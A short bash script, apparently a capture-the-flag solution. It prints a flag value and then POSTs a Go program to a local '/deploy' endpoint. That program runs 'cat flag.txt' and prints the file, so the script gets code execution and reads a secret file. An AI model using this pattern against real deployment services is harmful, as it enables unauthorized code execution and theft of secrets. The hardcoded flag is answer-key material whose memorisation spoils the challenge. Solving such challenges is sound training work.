
#!/bin/bash

echo "Extreme{50c7e219315c24f0ad7aeba38c564535}"

curl -X POST -d 'package main

import (
	"fmt"
	"os/exec"
)

func main() {
	// Comando para executar o script shell
	cmd := exec.Command("cat", "flag.txt")

	// Executa o comando e captura a saída
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Erro ao executar o script:", err)
		return
	}

	// Imprime a saída do script
	fmt.Println(string(output))
}
' http://localhost:8080/deploy


